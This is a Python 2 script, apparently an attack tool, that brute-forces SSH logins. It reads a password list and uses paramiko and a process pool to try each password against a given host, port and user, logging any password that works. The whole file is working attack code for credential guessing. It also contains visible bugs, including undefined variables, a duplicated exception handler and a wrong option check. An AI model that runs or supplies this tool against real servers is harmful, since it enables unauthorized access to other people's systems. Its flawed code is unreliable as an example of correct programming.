import sys
import os
import multiprocessing
import signal
import paramiko #connect SSH
import optparse 
import time
import Queue
from datetime import datetime
import socket
import traceback
from functools import partial
from multiprocessing.pool import Pool

MAX_PROC=2*multiprocessing.cpu_count()

class LOG(object):
    @staticmethod
    def info(msg):
        now=str(datetime.now())
        print("[INFO %s]: %s" % (now, msg))

    @staticmethod
    def error(msg):
        now=str(datetime.now())
        print("[ERROR %s]: %s" % (now, msg))

    @staticmethod
    def warn(msg):
        now=str(datetime.now())
        print("[WARN %s]: %s" % (now, msg))

    @staticmethod
    def debug(msg):
        now=str(datetime.now())
        print("[DEBUG %s]: %s" % (now, msg))
log=LOG

class TaskResult(object):
    def __init__(self):
        self.status = False
        self.result = {}
    def tostring(self):
        return "[TaskResult]:%s\t%s" % (self.status, self.result)

def worker(taskinfo, password):
	task=None
	retryCnt=0
	password=password
	host=taskinfo['host']
	username=taskinfo['username']
	port=taskinfo['port']
	maxRetryTime=taskinfo['maxRetryTime']
	timeout=taskinfo['timeout']
	
	while True:
		try:
		    taskResult=ssh_connect(host, username, password, port, timeout)
		    if taskResult.status:
		    	if(taskResult.result['msg']=='found'):
		    		log.info(' [*]  password found!!! : [host:{0},username:{1},password:{2}]'.format(host,username,password))
		    	break

		except socket.timeout as error:
			tcount+=1
			log.error("socket error:%s".format(traceback.format_exc()))
			if(tcount < timeout):
				log.error('Please check the network connection, SSH Connection socket timeout, exit after {0} seconds if it happened again and again.'.format(timeout))
				time.sleep(1)
			else:
				# sys.exit(0)
				client.close()
		except paramiko.ssh_exception.NoValidConnectionsError as e:
		    log.error('SSH transport is not ready, please check the network connection and ensure that the ssh port is opened!')
		    client.close()
		except socket.timeout as error:
			break
		except Exception, e:
		    log.error("Exception:%s" % (traceback.format_exc()))
		    # log.error("target host is down, exception:%s", str(e))
		    retryCnt+=1
		    if(retryCnt<maxRetryTime):
		    	continue
		    else:
		    	log.error('[mp_process]Error: It has reached maximum retry time, abort it')
		    	client.close()
		    	break
        

def signal_handler( signal, frame ):
    print "\n[!] Exiting..."
    os._exit(1)


def ssh_connect(host, username, password, port, timeout=5):
	taskResult = TaskResult()
	status = False
	found = False
	other_exp = False
	auth_error=False
	tcount = 0

	client = paramiko.SSHClient()
	client.load_system_host_keys()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		client.connect(
			hostname=host, port=port,
			username=username, password=password,
			timeout=float(timeout),banner_timeout=timeout
		)
		found = True
		status = True
		taskResult.result['msg'] = 'found'
		log.info(' [-]  Auth OK : [host:{0},username:{1},password:{2}]'.format(host,username,password))
	except paramiko.AuthenticationException, e:
		log.error('[+] Auth Failed: [host:{0},username:{1},password:{2}]'.format(host,username,password))
		auth_error=True
		status = True
		taskResult.result['msg'] = str(e)
		client.close()
	except paramiko.SSHException:
		log.error("!SSHException:%s".format(traceback.format_exc()))
	except socket.timeout as error:
		# log.error("socket timeout:%s" % (traceback.format_exc()))
		log.error("socket timeout,please check your network connection!")
		client.close()
		raise

	taskResult.status = status
	return taskResult


def main():
	# ts=time()
	parser = optparse.OptionParser("usage%prog -H <target host> -U <user> -F <password list> -P <port number>")
	parser.add_option('-H', dest='TargetHost', type='string', help='specify target host')
	parser.add_option('-U', dest='user', type='string', help='specify the user')
	parser.add_option('-T', dest='timeout', type='string', help='specify the run time')
	parser.add_option('-F', dest='PasswordFile', type='string', help='specify password file')
	parser.add_option('-P', dest='portNumber', type='int', help='specify the port number')
	parser.add_option('-X', dest='maxRetryTime', type='string', help='the number of maximum time retry time')
	parser.add_option('-M', dest='maxThreads', type='int', default=4,help='maximum number of threads (optional: default is 4)')

	(options, args) = parser.parse_args()
	host = options.TargetHost
	port = options.portNumber
	user = options.user
	timeout = options.timeout
	maxRetryTime = options.maxRetryTime
	maxThreads = options.maxThreads
	print options
	PasswordFile = options.PasswordFile
	if (host == None) | (user == None) | (time == None) | (PasswordFile == None) | (port == None):
	    print parser.usage
	    exit(0)

	passwords=[]
	with open(PasswordFile,'r') as f:
	      passwords = [l.strip('\r').strip('\n').strip() for l in f.readlines()]

	signal.signal( signal.SIGINT, signal_handler)
	pool = Pool(processes=max(maxThreads, MAX_PROC))
	taskinfo={}
	taskinfo['host'] = host
	taskinfo['username'] = user
	taskinfo['port'] = port
	taskinfo['maxRetryTime'] = maxRetryTime
	taskinfo['timeout'] = timeout

	_worker = partial(worker, taskinfo)
	try:
		pool.map_async(_worker, passwords) 
		pool.close()
		pool.join()
	except KeyboardInterrupt:
		print "Caught KeyboardInterrupt, terminating workers"
		pool.terminate()
		pool.join()

if __name__ == '__main__':
	main()
